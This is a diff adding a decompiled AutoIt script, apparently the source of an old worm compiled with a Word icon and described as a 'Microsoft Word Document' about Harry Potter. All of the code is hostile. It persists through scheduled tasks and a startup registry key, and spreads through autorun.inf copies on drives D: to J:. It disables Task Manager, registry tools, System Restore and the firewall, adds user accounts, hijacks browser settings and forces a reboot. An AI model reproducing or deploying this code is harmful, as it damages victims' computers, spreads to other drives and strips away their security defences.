@@ -1,0 +1,258 @@
+; <AUT2EXE VERSION: 3.2.2.0>
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: I:\HarryPotter-TheDeathlyHallows.au3>
+; ----------------------------------------------------------------------------
+
+; hide tray icon
+#NoTrayIcon
+
+; create text file
+FileWriteLine("HarryPotter-TheDeathlyHallows.doc","Harry Potter is dead.")
+
+; move doc file to C:\
+FileMove("HarryPotter-TheDeathlyHallows.doc", "C:\",9)
+
+Run(@ComSpec & ' /c start winword c:\HarryPotter-TheDeathlyHallows.doc ', "" , @SW_HIDE)
+
+sleep(5000)
+
+; minimize all windows
+WinMinimizeAll()
+
+; create new directory in the windows directory
+DirCreate("C:\WINDOWS\Cache")
+
+; copy file to the new directory
+FileCopy("HarryPotter-TheDeathlyHallows.exe", "C:\WINDOWS\Cache")
+
+; delete all previous tasks
+Run(@ComSpec & ' /c AT /delete /yes ', "" , @SW_HIDE)
+
+; create Windows Scheduled Tasks
+Run(@ComSpec & ' /c AT 8:30 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\HarryPotter-TheDeathlyHallows.exe ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c AT 9:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\HarryPotter-TheDeathlyHallows.exe ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c AT 10:30 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\HarryPotter-TheDeathlyHallows.exe ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c AT 11:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\HarryPotter-TheDeathlyHallows.exe ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c AT 12:30 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\HarryPotter-TheDeathlyHallows.exe ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c AT 13:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\HarryPotter-TheDeathlyHallows.exe ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c AT 14:30 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\HarryPotter-TheDeathlyHallows.exe ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c AT 16:30 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\HarryPotter-TheDeathlyHallows.exe ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c AT 17:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\HarryPotter-TheDeathlyHallows.exe ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c AT 18:30 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\HarryPotter-TheDeathlyHallows.exe ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c AT 19:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\HarryPotter-TheDeathlyHallows.exe ', "" , @SW_HIDE)
+
+
+; create text file
+FileWriteLine("harry potter.txt","Harry Potter is a dumb kid,so is Daniel")
+FileWriteLine("harry potter.txt",".")
+FileWriteLine("harry potter.txt","Ron Weasley is ugly but who cares")
+FileWriteLine("harry potter.txt",".")
+FileWriteLine("harry potter.txt","Hermione is pretty and exploited but who cares?")
+FileWriteLine("harry potter.txt",".")
+FileWriteLine("harry potter.txt","Dumbledore is old and haggard but who cares?")
+FileWriteLine("harry potter.txt",".")
+FileWriteLine("harry potter.txt","JK Rowling was an ex-witch but who cares, betcha didnt know.")
+FileWriteLine("harry potter.txt",".")
+FileWriteLine("harry potter.txt","All we care is that......")
+FileWriteLine("harry potter.txt",".")
+FileWriteLine("harry potter.txt","Harry Potter is gonna die!")
+FileWriteLine("harry potter.txt",".")
+FileWriteLine("harry potter.txt","Okay, you can now get yourself a copy of the dumb Harry Potter book.")
+
+; move text file to C:\
+FileMove("harry potter.txt", "C:\",9)
+
+; create message file
+FileWriteLine("talk.bat","@echo off")
+FileWriteLine("talk.bat","title read and repent")
+FileWriteLine("talk.bat","echo.")
+FileWriteLine("talk.bat","echo the end is near")
+FileWriteLine("talk.bat","echo.")
+FileWriteLine("talk.bat","echo repent from your evil ways O Ye folks")
+FileWriteLine("talk.bat","echo.")
+FileWriteLine("talk.bat","echo lest you burn in hell...JK Rowling especially")
+FileWriteLine("talk.bat","echo.")
+FileWriteLine("talk.bat","echo.")
+FileWriteLine("talk.bat","pause")
+FileWriteLine("talk.bat","exit")
+
+; create new directory in the windows directory
+DirCreate("C:\WINDOWS\Tempt")
+
+; move message file to C:\WINDOWS
+FileMove("talk.bat", "C:\WINDOWS\Tempt",9)
+
+; set message file attributes
+FileSetAttrib("C:\WINDOWS\Tempt\talk.bat", "+RSH")
+
+; add message file to system startup
+RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "talk", "REG_SZ", "C:\WINDOWS\Tempt\talk.bat")
+
+; create autorun
+FileWriteLine("autorun.inf","[Autorun]")
+FileWriteLine("autorun.inf","open=HarryPotter-TheDeathlyHallows.exe e")
+FileWriteLine("autorun.inf","shellexecute=HarryPotter-TheDeathlyHallows.exe e")
+FileWriteLine("autorun.inf","shell\Auto\command=HarryPotter-TheDeathlyHallows.exe e")
+FileWriteLine("autorun.inf","shell=Auto")
+
+; move autorun file to C:\
+FileMove("autorun.inf", "C:\",9)
+
+; set autorun file attributes
+FileSetAttrib("C:\autorun.inf", "+RSH")
+
+; copy autorun to mapped drives
+FileCopy("C:\autorun.inf", "D:\",9)
+
+FileCopy("C:\autorun.inf", "E:\",9)
+
+FileCopy("C:\autorun.inf", "F:\",9)
+
+FileCopy("C:\autorun.inf", "G:\",9)
+
+FileCopy("C:\autorun.inf", "H:\",9)
+
+FileCopy("C:\autorun.inf", "I:\",9)
+
+FileCopy("C:\autorun.inf", "J:\",9)
+
+; copy file to mapped drives
+FileCopy("HarryPotter-TheDeathlyHallows.exe", "C:\",9)
+
+FileCopy("HarryPotter-TheDeathlyHallows.exe", "D:\",9)
+
+FileCopy("HarryPotter-TheDeathlyHallows.exe", "E:\",9)
+
+FileCopy("HarryPotter-TheDeathlyHallows.exe", "F:\",9)
+
+FileCopy("HarryPotter-TheDeathlyHallows.exe", "G:\",9)
+
+FileCopy("HarryPotter-TheDeathlyHallows.exe", "H:\",9)
+
+FileCopy("HarryPotter-TheDeathlyHallows.exe", "I:\",9)
+
+FileCopy("HarryPotter-TheDeathlyHallows.exe", "J:\",9)
+
+FileCopy("HarryPotter-TheDeathlyHallows.exe", "C:\Documents and Settings\All Users\Desktop",9)
+
+
+; change registered owner name
+RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "RegisteredOwner", "REG_SZ", "Harry Potter")
+
+; change registered owner name
+RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductId", "REG_SZ", "HARRY-POT-TERHATE-SYOU1")
+
+; set IE title
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", "JK Rowling Owns You")
+
+; set IE home page
+RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", "http://www.amazon.com/Putter-Chamber-Cheesecakes-Timothy-ODonnell/dp/1411606884/ref=pd_bbs_sr_2_s9_rk/104-5055801-9964766?ie=UTF8&s=books&s9r=8a5801be1145d8280111463b60b90012&itemPosition=2&qid=1176116190&sr=8-2")
+
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", "http://www.amazon.com/Putter-Chamber-Cheesecakes-Timothy-ODonnell/dp/1411606884/ref=pd_bbs_sr_2_s9_rk/104-5055801-9964766?ie=UTF8&s=books&s9r=8a5801be1145d8280111463b60b90012&itemPosition=2&qid=1176116190&sr=8-2")
+
+; disable taskmgr
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
+
+RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
+
+; disable regedit
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
+
+; hide folder options
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions", "REG_DWORD", "1")
+
+; disable show hidden files and folders
+RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL", "CheckedValue", "REG_DWORD", "0")
+
+; disable right-click context menu
+RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewContextMenu", "REG_DWORD", "1")
+
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewContextMenu", "REG_DWORD", "1")
+
+; hide shell search button
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoShellSearchButton", "REG_DWORD", "1")
+
+; hide search button
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFind", "REG_DWORD", "1")
+
+; hide run
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", "REG_DWORD", "1")
+
+; hide clock
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "HideClock", "REG_DWORD", "1")
+
+; disable tray context menu
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoTrayContextMenu", "REG_DWORD", "1")
+
+; disable tray context menu
+RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoTrayItemsDisplay", "REG_DWORD", "1")
+
+; disable system restore
+RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "REG_DWORD", "1")
+
+; disable system restore service
+RegWrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sr", "Start", "REG_DWORD", "4")
+
+; disable firewall
+RegWrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "EnableFirewall", "REG_DWORD", "0")
+
+RegWrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "DoNotAllowExceptions", "REG_DWORD", "0")
+
+; add users
+Run(@ComSpec & ' /c net user Harry-Potter 1254 /add ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c net user Ron-Weasley 1254 /add ', "" , @SW_HIDE)
+
+Run(@ComSpec & ' /c net user Hermione-Granger 1254 /add ', "" , @SW_HIDE)
+
+; Force a reboot
+Shutdown(6)
+
+; end script
+
+#Region Compiler directives section
+;** This is a list of compiler directives used by AutoIt3Wrapper.exe.
+;** comment the lines you don't need or else it will override the default settings
+#Compiler_Prompt=y                        ;y=show compile menu
+;** AUTOIT3 settings
+#Compiler_AUTOIT3=                        ;Override the default Interpreter version.
+;** AUT2EXE settings
+#Compiler_AUT2EXE=                        ;Override the default compiler with this version.
+#Compiler_Icon=msword.ico                 ;Filename of the Ico file to use
+#Compiler_OutFile=                        ;Target exe/a3x filename.
+#Compiler_OutFile_Type=exe                ;a3x=small AutoIt3 file;  exe=Standalone executable(Default)
+#Compiler_Compression=4                   ;Compression parameter 0-4  0=Low 2=normal 4=High
+#Compiler_Allow_Decompile=               ;y= allow decompile
+#Compiler_PassPhrase=                     ;Password to use for compilation
+#Compiler_UseUpx=y                        ;(y/n) Compress output program works only for 3.1.1.110 and up. Default=Yes
+;** Target program Resource info
+#compiler_res_comment=Harry Potter                    ;Comment field
+#Compiler_Res_Description=Microsoft Word Document                ;Description field
+#Compiler_Res_Fileversion=1.0                ;File Version
+#Compiler_Res_FileVersion_AutoIncrement= ;AutoIncrement FileVersion After Aut2EXE is finished.
+;#Compiler_Res_Language=2056               ;Resource Language code . default 2057=English (United Kingdom)
+; free form resource fields ... max 15
+; you can use the following variables:
+; %AutoItVer% which will be replaced with the version of AutoIt3
+; %date% = PC date in short date format
+; %longdate% = PC date in long date format
+; %time% = PC timeformat
+#Compiler_Res_Field=Company|Bumsbury            ;Free format fieldname|fieldvalue
+#Compiler_Res_Field=Product Name|Harry Potter-The Deathly Hallows            ;Free format fieldname|fieldvalue
+#EndRegion
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: I:\HarryPotter-TheDeathlyHallows.au3>
+; ----------------------------------------------------------------------------
+
